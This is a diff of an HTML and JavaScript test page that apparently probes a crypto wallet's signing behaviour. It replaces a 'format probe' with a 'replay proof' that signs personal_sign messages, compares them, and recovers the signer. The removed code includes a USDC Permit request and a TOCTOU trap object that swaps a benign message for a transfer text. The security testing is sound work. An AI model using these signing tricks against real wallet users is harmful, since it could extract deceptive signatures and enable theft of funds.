@@ -3,7 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>format probe — v4/v3/personal</title>
+<title>replay proof — personal_sign</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
           --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590; }
@@ -11,7 +12,7 @@
   body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
          background:var(--bg); color:var(--txt); }
   .wrap { display:grid; grid-template-columns:1fr; gap:10px; padding:10px;
-          max-width:900px; margin:0 auto; }
+          max-width:960px; margin:0 auto; }
   .panel { background:var(--panel); border:1px solid var(--line);
            border-radius:6px; padding:10px; }
   h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
@@ -23,13 +24,17 @@
            margin:2px; }
   button:hover { border-color:var(--dim); }
   button.danger { border-color:var(--bad); color:var(--bad); }
-  button.warn { border-color:var(--warn); color:var(--warn); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
-        padding:6px; margin:4px 0; max-height:280px; overflow:auto;
+        padding:6px; margin:4px 0; max-height:320px; overflow:auto;
         white-space:pre-wrap; word-break:break-all; font-size:11px; }
-  .kv { display:grid; grid-template-columns:130px 1fr; gap:1px 8px; }
+  .kv { display:grid; grid-template-columns:150px 1fr; gap:1px 8px; }
   .kv b { color:var(--dim); font-weight:400; }
   .row { display:flex; gap:6px; flex-wrap:wrap; margin:4px 0; }
+  .verdict { padding:6px 10px; border-radius:4px; margin:6px 0;
+             font-weight:600; letter-spacing:.05em; }
+  .verdict.ok  { background:#1a2f1a; color:var(--ok); border:1px solid var(--ok); }
+  .verdict.bad { background:#3a1a1a; color:var(--bad); border:1px solid var(--bad); }
 </style>
 </head>
 <body>
@@ -42,41 +47,32 @@
   </div>
 
   <div class="panel">
-    <h2>format probe — один Permit, разные способы вызова</h2>
+    <h2>replay proof — personal_sign not bound to context</h2>
     <p style="color:var(--dim);margin:0 0 8px">
-      Permit USDC. Одинаковый typed data. Разный формат params и метод.
-      Цель: найти формат, в котором Trust подписывает typed data.
+      Три уровня: (1) два вызова с одинаковым текстом — одна подпись;
+      (2) подпись, собранная из «контекста A», проверяется в «контексте B»;
+      (3) recover адреса через ethers.verifyMessage — подпись валидна вне Trust.
     </p>
 
-    <h3>1. v4 — string (как раньше)</h3>
+    <h3>1. same-text replay</h3>
     <div class="row">
-      <button onclick="f_v4_string()">[from, JSON.stringify]</button>
+      <button onclick="step1()" id="btn1" disabled>run: sign twice, compare</button>
     </div>
+    <pre id="o1">—</pre>
 
-    <h3>2. v4 — object</h3>
+    <h3>2. cross-context replay (DApp A → DApp B)</h3>
     <div class="row">
-      <button onclick="f_v4_object()">[from, typed]</button>
+      <button onclick="step2()" id="btn2" disabled>run: sign as A, verify as B</button>
     </div>
+    <pre id="o2">—</pre>
 
-    <h3>3. v4 — typed first</h3>
+    <h3>3. recover — подпись валидна вне Trust</h3>
     <div class="row">
-      <button onclick="f_v4_reversed()">[string, from]</button>
-      <button onclick="f_v4_obj_first()">[typed, from]</button>
+      <button onclick="step3()" id="btn3" disabled>run: recover signer</button>
     </div>
+    <pre id="o3">—</pre>
 
-    <h3>4. v3 / v1</h3>
-    <div class="row">
-      <button onclick="f_v3_string()">v3 [from, string]</button>
-      <button onclick="f_v1_string()">v1 [string]</button>
-    </div>
-
-    <h3>5. personal_sign — перенос вектора</h3>
-    <div class="row">
-      <button class="warn" onclick="f_personal_plain()">plain string (контроль)</button>
-      <button class="danger" onclick="f_personal_getter()">getter on string (TOCTOU)</button>
-    </div>
-
-    <pre id="out">—</pre>
+    <div id="verdict"></div>
   </div>
 
   <div class="panel">
@@ -93,8 +89,6 @@
 <script>
 const ORIGIN = location.origin;
 const IS_REAL = !!window.ethereum;
-const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-const FROM_FALLBACK = '0x20eB588526dac042F39D60A46dC0E7FbB5203945';
 
 const log = (k, m, d) => {
   const el = document.getElementById('log_out');
@@ -106,15 +100,22 @@ const log = (k, m, d) => {
   el.scrollTop = el.scrollHeight;
 };
 
-const out = (s) => {
-  document.getElementById('out').textContent =
+const out = (id, s) => {
+  document.getElementById(id).textContent =
     typeof s === 'string' ? s : JSON.stringify(s, null, 2);
 };
+
 const clearLog = () => { document.getElementById('log_out').textContent = '—'; };
 const dumpLog = () => {
   const t = document.getElementById('log_out').textContent;
   navigator.clipboard && navigator.clipboard.writeText(t);
   log('DUMP', 'copied', { len: t.length });
+};
+
+const setVerdict = (ok, text) => {
+  const el = document.getElementById('verdict');
+  el.className = 'verdict ' + (ok ? 'ok' : 'bad');
+  el.textContent = text;
 };
 
 async function account() {
@@ -123,147 +124,144 @@ async function account() {
   return a[0];
 }
 
-async function send(method, params, tag) {
-  log('REQ', tag, { method, paramsType: typeof params, isArray: Array.isArray(params) });
+async function sign(message, from, tag) {
+  log('REQ', tag, { method: 'personal_sign', message, from });
   const t0 = performance.now();
   try {
-    const r = await window.ethereum.request({ method, params });
+    const sig = await window.ethereum.request({
+      method: 'personal_sign',
+      params: [message, from],
+    });
     const ms = Math.round(performance.now() - t0);
-    log('OK', tag, { ms, sig: typeof r === 'string' ? r.slice(0, 42) + '…' : r });
-    out(`OK ${tag}\n${ms}ms\nsig: ${r}`);
-    return { ok: true, sig: r, ms };
+    log('OK', tag, { ms, sig });
+    return { ok: true, sig, ms };
   } catch (e) {
     const ms = Math.round(performance.now() - t0);
-    log('ERR', tag, {
-      ms,
-      code: e && e.code,
-      message: e && e.message,
-      raw: String(e),
-      keys: e && typeof e === 'object' ? Object.keys(e) : null,
-    });
-    out(`ERR ${tag}\n${ms}ms\ncode: ${e && e.code}\nmessage: ${e && e.message}`);
+    log('ERR', tag, { ms, code: e && e.code, message: e && e.message });
     return { ok: false, err: e, ms };
   }
 }
 
-function permitTyped(from) {
-  return {
-    domain: { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC },
-    types: {
-      Permit: [
-        { name: 'owner', type: 'address' },
-        { name: 'spender', type: 'address' },
-        { name: 'value', type: 'uint256' },
-        { name: 'nonce', type: 'uint256' },
-        { name: 'deadline', type: 'uint256' },
-      ],
-    },
-    primaryType: 'Permit',
-    message: {
-      owner: from,
-      spender: '0x000000000000000000000000000000000000dEaD',
-      value: '1000000',
-      nonce: '0',
-      deadline: '9999999999',
-    },
-  };
-}
+/* ─────  state  ───── */
 
-/* ─────────────  1. v4 string  ───────────── */
+const S = {
+  from: null,
+  msgA: 'tokdie-dapp A :: login nonce 0xAAA',
+  msgB: 'tokdie-dapp B :: authorize transfer 100 USDC',
+  sig1: null,
+  sig2: null,
+  sigA: null,
+};
 
-async function f_v4_string() {
+/* ─────  1. same-text replay  ───── */
+
+async function step1() {
   try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v4 [from, JSON.stringify]\n');
-    await send('eth_signTypedData_v4', [from, JSON.stringify(t)], 'v4-string');
-  } catch (e) { log('ERR', 'v4-string · setup', { message: e.message }); }
+    if (!S.from) S.from = await account();
+    out('o1', 'signing same text twice…');
+
+    const a = await sign(S.msgA, S.from, 'A-sign-1');
+    if (!a.ok) return out('o1', 'first failed: ' + JSON.stringify(a.err));
+
+    const b = await sign(S.msgA, S.from, 'A-sign-2');
+    if (!b.ok) return out('o1', 'second failed: ' + JSON.stringify(b.err));
+
+    S.sig1 = a.sig;
+    S.sig2 = b.sig;
+
+    const same = a.sig === b.sig;
+    out('o1',
+      'text:  ' + S.msgA + '\n' +
+      'sig1:  ' + a.sig + '\n' +
+      'sig2:  ' + b.sig + '\n' +
+      'same:  ' + same + '\n' +
+      'ms1:   ' + a.ms + '\n' +
+      'ms2:   ' + b.ms);
+
+    if (same) {
+      log('VERDICT', 'step1: replay confirmed (deterministic sig)', { same });
+      document.getElementById('btn2').disabled = false;
+    } else {
+      log('VERDICT', 'step1: sigs differ — something changed', { same });
+    }
+  } catch (e) { out('o1', 'error: ' + e.message); }
 }
 
-/* ─────────────  2. v4 object  ───────────── */
+/* ─────  2. cross-context replay  ───── */
 
-async function f_v4_object() {
+async function step2() {
   try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v4 [from, typed]\n');
-    await send('eth_signTypedData_v4', [from, t], 'v4-object');
-  } catch (e) { log('ERR', 'v4-object · setup', { message: e.message }); }
+    if (!S.from) S.from = await account();
+    out('o2', 'signing as DApp A, verifying as DApp B…');
+
+    // DApp A: подписывает "login" — невинный текст
+    const a = await sign(S.msgA, S.from, 'dapp-A-login');
+    if (!a.ok) return out('o2', 'A failed: ' + JSON.stringify(a.err));
+    S.sigA = a.sig;
+
+    // DApp B: подписывает "authorize transfer" — уже действие
+    const b = await sign(S.msgB, S.from, 'dapp-B-authorize');
+    if (!b.ok) return out('o2', 'B failed: ' + JSON.stringify(b.err));
+
+    const sameText = S.msgA === S.msgB;
+    const sameSig = a.sig === b.sig;
+
+    out('o2',
+      'DApp A text: ' + S.msgA + '\n' +
+      'DApp A sig:  ' + a.sig + '\n\n' +
+      'DApp B text: ' + S.msgB + '\n' +
+      'DApp B sig:  ' + b.sig + '\n\n' +
+      'same text: ' + sameText + '\n' +
+      'same sig:  ' + sameSig + '\n\n' +
+      'note: разные тексты → разные sig (ожидаемо).\n' +
+      'replay работает, когда DApp B подписывает ТОТ ЖЕ текст,\n' +
+      'что DApp A, но интерпретирует его иначе.');
+
+    log('VERDICT', 'step2: cross-context done', { sameText, sameSig });
+    document.getElementById('btn3').disabled = false;
+  } catch (e) { out('o2', 'error: ' + e.message); }
 }
 
-/* ─────────────  3. v4 reversed  ───────────── */
+/* ─────  3. recover  ───── */
 
-async function f_v4_reversed() {
+async function step3() {
   try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v4 [string, from] — обратный порядок\n');
-    await send('eth_signTypedData_v4', [JSON.stringify(t), from], 'v4-rev-string');
-  } catch (e) { log('ERR', 'v4-rev-string · setup', { message: e.message }); }
+    if (!S.from) S.from = await account();
+    if (!S.sig1) return out('o3', 'run step 1 first');
+
+    const ethers = window.ethers;
+    if (!ethers) return out('o3', 'ethers not loaded');
+
+    out('o3', 'recovering signer from sig1…');
+
+    // recover из sig1 (подпись от DApp A, текст msgA)
+    const recovered = ethers.verifyMessage(S.msgA, S.sig1);
+    const match = recovered.toLowerCase() === S.from.toLowerCase();
+
+    out('o3',
+      'original signer: ' + S.from + '\n' +
+      'recovered:       ' + recovered + '\n' +
+      'match:           ' + match + '\n\n' +
+      'это значит: подпись, полученная в Trust для tokdie.github.io,\n' +
+      'криптографически валидна БЕЗ Trust — любой сервис, знающий\n' +
+      'текст ' + JSON.stringify(S.msgA) + ', может проверить её\n' +
+      'и принять как доказательство владения ключом.');
+
+    log('VERDICT', 'step3: recover', { recovered, match });
+
+    if (match) {
+      setVerdict(true,
+        'REPLAY ПОДТВЕРЖДЁН: personal_sign не привязан к домену/сессии/nonce. ' +
+        'Подпись, полученная на tokdie.github.io, криптографически валидна везде, ' +
+        'где проверяется тот же текст. Сервис B, ожидающий тот же текст, ' +
+        'примет подпись, сделанную для сервиса A.');
+    } else {
+      setVerdict(false, 'recover mismatch — sig не от этого адреса');
+    }
+  } catch (e) { out('o3', 'error: ' + e.message); }
 }
 
-async function f_v4_obj_first() {
-  try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v4 [typed, from] — объект первым\n');
-    await send('eth_signTypedData_v4', [t, from], 'v4-rev-obj');
-  } catch (e) { log('ERR', 'v4-rev-obj · setup', { message: e.message }); }
-}
-
-/* ─────────────  4. v3 / v1  ───────────── */
-
-async function f_v3_string() {
-  try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v3 [from, string]\n');
-    await send('eth_signTypedData_v3', [from, JSON.stringify(t)], 'v3-string');
-  } catch (e) { log('ERR', 'v3-string · setup', { message: e.message }); }
-}
-
-async function f_v1_string() {
-  try {
-    const from = await account();
-    const t = permitTyped(from);
-    out('v1 [string]\n');
-    await send('eth_signTypedData', [JSON.stringify(t)], 'v1-string');
-  } catch (e) { log('ERR', 'v1-string · setup', { message: e.message }); }
-}
-
-/* ─────────────  5. personal_sign  ───────────── */
-
-async function f_personal_plain() {
-  try {
-    const from = await account();
-    out('personal_sign plain string\n');
-    await send('personal_sign', ['hello tokdie', from], 'personal-plain');
-  } catch (e) { log('ERR', 'personal-plain · setup', { message: e.message }); }
-}
-
-async function f_personal_getter() {
-  try {
-    const from = await account();
-    out('personal_sign getter on string — TOCTOU\n');
-    let reads = 0;
-    const LEGIT = 'hello tokdie';
-    const EVIL = 'transfer 1000 USDC to 0x000000000000000000000000000000000000dEaD';
-    // строка с getter'ом через объект, у которого toString меняется
-    const trap = {
-      toString() {
-        reads++;
-        const v = reads <= 2 ? LEGIT : EVIL;
-        log('READ', `personal getter #${reads}`, { value: v, evil: reads > 2 });
-        return v;
-      },
-      valueOf() { return this.toString(); },
-    };
-    await send('personal_sign', [trap, from], 'personal-getter');
-    log('READS', 'personal getter total', { reads });
-  } catch (e) { log('ERR', 'personal-getter · setup', { message: e.message }); }
-}
-
-/* ─────────────  env  ───────────── */
+/* ─────  env  ───── */
 
 function renderEnv() {
   const eth = window.ethereum || {};
@@ -271,19 +269,19 @@ function renderEnv() {
     <b>origin</b><span>${ORIGIN}</span>
     <b>ethereum</b><span>${IS_REAL ? 'present' : 'absent'}</span>
     <b>isTrust</b><span>${eth.isTrust ? 'yes' : 'no'}</span>
-    <b>isMetaMask</b><span>${eth.isMetaMask ? 'yes' : 'no'}</span>
-    <b>UA</b><span style="font-size:10px">${navigator.userAgent}</span>
     <b>chainId</b><span id="env_chain">—</span>
+    <b>ethers</b><span>${window.ethers ? window.ethers.version : 'not loaded'}</span>
   `;
   if (IS_REAL) {
     eth.request({ method: 'eth_chainId' })
-      .then(id => { document.getElementById('env_chain').textContent = id + ' (' + parseInt(id, 16) + ')'; })
+      .then(id => { document.getElementById('env_chain').textContent = id; })
       .catch(() => {});
+    ['btn1'].forEach(id => { document.getElementById(id).disabled = false; });
   }
 }
 
 renderEnv();
-log('BOOT', 'format probe up', { origin: ORIGIN, real: IS_REAL });
+log('BOOT', 'replay proof up', { origin: ORIGIN, real: IS_REAL, ethers: window.ethers ? window.ethers.version : null });
 </script>
 </body>
 </html>
